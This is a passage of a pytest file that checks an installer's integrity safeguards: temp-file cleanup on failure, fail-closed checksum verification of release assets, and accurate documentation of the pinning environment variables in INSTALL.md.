    tail = exemption[: exemption.index('Write-Warn "Authenticode verification FAILED')]
    assert "return $false" in tail, "the UnknownError branch falls through to the failure branch"
    assert "throw" not in tail and "Remove-Item" not in tail, (
        "the UnknownError branch deletes or aborts; it must be non-fatal"
    )


def test_ps1_temp_downloads_are_cleaned_up_on_failure_paths():
    """Pass 1 deleted the uv installer and the SDK bootstrapper only on their
    success paths, so a hash mismatch or a non-zero exit left an unverified,
    executable download at a predictable %TEMP% path on a box that had just run
    an elevated installer."""
    text = read_ps1()

    uv = ps1_function_body(text, "Install-UV")
    assert re.search(r"\}\s*finally\s*\{", uv), "Install-UV has no finally block"
    finally_body = uv[uv.rindex("finally"):]
    assert "Remove-Item" in finally_body and "uvInstaller" in finally_body, (
        "Install-UV's finally does not delete the downloaded installer"
    )

    windbg = ps1_function_body(text, "Install-WinDbg")
    assert re.search(r"\}\s*finally\s*\{", windbg), (
        "Install-WinDbg has no finally block, so a failed signature check leaves "
        "winsdksetup.exe in %TEMP%"
    )
    sdk_finally = windbg[windbg.rindex("finally"):]
    assert "Remove-Item" in sdk_finally and "sdkSetup" in sdk_finally

    # The staging directory for the plugin binaries was already cleaned up in
    # pass 1; keep it that way.
    x64dbg = ps1_function_body(text, "Install-X64Dbg")
    assert re.search(r"finally\s*\{[^}]*Remove-Item[^}]*stagingDir", x64dbg, re.DOTALL)


def test_ps1_fails_closed_when_the_manifest_omits_a_plugin_asset():
    """A release that publishes SHA256SUMS but does not list obsidian.dp64 is not
    a packaging slip - release.yml refuses to publish a partial manifest - it is
    what an asset swapped in after the manifest was generated looks like.
    Falling back to the 'unverified' warning there would install an unlisted DLL
    into the x64dbg plugins directory."""
    body = strip_ps1_comments(ps1_function_body(read_ps1(), "Install-X64Dbg"))

    assert "Get-ReleaseChecksumMap" in body
    # Guard: manifest non-empty but this asset absent -> throw.
    assert re.search(r"\$checksums\.Count\s+-gt\s+0", body), (
        "no fail-closed branch for 'manifest exists but omits this asset'"
    )
    count_idx = body.index("$checksums.Count -gt 0")
    assert "throw" in body[count_idx:count_idx + 700], (
        "the manifest-omits-asset case does not abort the plugin install"
    )
    # The operator escape hatch must still work, or the fail-closed branch makes
    # a pinned digest unusable.
    assert "Get-PinnedSha256" in body, (
        "an operator-pinned digest can no longer override the release manifest"
    )


def test_ps1_every_project_owned_asset_download_is_verified():
    """Structural: each of our own release assets is downloaded through the
    verifying wrapper with an expected digest supplied, and reaches the plugins
    directory only by a copy from staging."""
    body = strip_ps1_comments(ps1_function_body(read_ps1(), "Install-X64Dbg"))

    download_calls = [ln for ln in body.splitlines() if "Invoke-VerifiedDownload" in ln]
    assert download_calls, "Install-X64Dbg no longer downloads through the wrapper"

    assert re.search(r"-ExpectedSha256\s+\$expected", body), (
        "the plugin download does not pass the manifest digest through"
    )
    for name in PROJECT_OWNED_ASSETS:
        assert name in body
        assert re.search(rf"Copy-Item[^\n]*{re.escape(name)}", body)


def test_py_downloaded_scripts_are_removed_on_failure_paths():
    """install.py:757-767 / :813-820 unlinked the downloaded installer script
    only after subprocess.run succeeded, so a CalledProcessError left an
    executable network-sourced script in a world-readable temp directory."""
    tree = _py_tree()

    for name in ("install_uv", "install_dotnet_sdk", "download_repo_zip"):
        func = next(
            f for f in ast.walk(tree)
            if isinstance(f, ast.FunctionDef) and f.name == name
        )
        tries = [n for n in ast.walk(func) if isinstance(n, ast.Try) and n.finalbody]
        assert tries, f"{name}() has no try/finally, so failures leak the download"

        cleaned = False
        for node in tries:
            for stmt in node.finalbody:
                called = _called_names(stmt)
                if called & {"unlink", "remove", "rmtree", "unlink_missing_ok"}:
                    cleaned = True
        assert cleaned, f"{name}()'s finally block does not delete the download"


def test_py_download_and_verify_script_cleans_up_when_verification_fails(workdir, monkeypatch):
    """Behavioural counterpart to the static check above: nothing is left behind
    for a retry to pick up. (verify_sha256 deletes; assert it end to end.)"""
    source = workdir / "install.sh"
    source.write_text("#!/bin/sh\necho tampered\n")
    monkeypatch.setenv("BINARY_MCP_SHA256_UV_INSTALLER_SH", "ab" * 32)
    monkeypatch.setattr(tempfile, "tempdir", str(workdir))

    with pytest.raises(ValueError):
        install.download_and_verify_script(source.as_uri(), "uv installer", "uv-installer-sh")

    assert [p.name for p in workdir.iterdir()] == ["install.sh"], (
        "a rejected script survived in the temp directory"
    )


def test_install_md_documents_the_pin_env_var_for_every_project_owned_asset():
    """The pin tables in both installers carry no key for a binary-mcp-owned
    asset by default, so the only way an operator learns the variable name is
    from the docs (or from triggering the warning)."""
    text = INSTALL_MD_PATH.read_text(encoding="utf-8")

    for asset in PROJECT_OWNED_ASSETS:
        env_name = install.integrity_env_name(f"binary-mcp-{asset}")
        assert env_name in text, (
            f"INSTALL.md does not document {env_name}, the only way to pin {asset}"
        )

    for env_name in (
        "BINARY_MCP_SHA256_GHIDRA_ZIP",
        "BINARY_MCP_SHA256_X64DBG_SNAPSHOT",
        "BINARY_MCP_SHA256_UV_INSTALLER_PS1",
        "BINARY_MCP_SHA256_UV_INSTALLER_SH",
        "BINARY_MCP_SHA256_DOTNET_INSTALLER_SH",
        "BINARY_MCP_SHA256_WINDOWS_SDK_SETUP",
        "BINARY_MCP_SHA256_REPO_ZIP",
    ):
        assert env_name in text, f"INSTALL.md does not document {env_name}"


def test_install_md_status_note_matches_what_the_code_does():
    """The note must describe reality in both directions: it may not claim the
    plugins are verified while release.yml publishes nothing, and it may not
    keep claiming verification is inert once the manifest ships."""
    text = INSTALL_MD_PATH.read_text(encoding="utf-8")
    workflow = RELEASE_WORKFLOW_PATH.read_text(encoding="utf-8")

    publishes_manifest = "SHA256SUMS" in workflow and "sha256sum" in workflow

    if publishes_manifest:
        assert "currently **inert**" not in text, (
            "INSTALL.md still says verification is inert after release.yml "
            "started publishing SHA256SUMS"
        )
        assert "does not yet publish" not in text
        assert "SHA256SUMS" in text
    else:  # pragma: no cover - guards against the workflow step being deleted
        assert "inert" in text or "unverified" in text

    # Whatever the state, the residual risks stay documented: an unsigned
    # plugin, and a manifest that cannot survive a takeover of the release.
    assert "not code-signed" in text
    assert "takeover of the release" in text
    # And the pre-manifest releases are still called out honestly.
    assert re.search(r"predating|before that workflow|older release", text)
